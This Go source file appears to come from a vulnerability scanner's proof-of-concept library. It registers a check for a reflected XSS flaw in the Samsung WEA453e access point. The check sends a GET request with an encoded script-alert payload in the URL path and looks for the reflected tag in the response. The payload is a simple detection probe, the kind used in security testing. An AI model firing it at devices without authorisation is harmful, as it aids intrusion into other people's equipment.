package poc

func (Info *PocInfo) Samsung_Waln_Ap_XSS_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "samsung_waln_ap"
	poc.Info.Type = "XSS"
	poc.Info.Name = "Samsung Waln Ap WEA453e reflect XSS"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/%3Cscript%3Ealert(1)%3C/script%3E"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = func() map[string]string {
		mapTemp := make(map[string]string)
		mapTemp["Content-Type"] = "application/x-www-form-urlencoded"
		return mapTemp
	}()
	poc.Poc.Data = []string{""}
	poc.Poc.Word = []string{"<script>alert(1)</script>"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
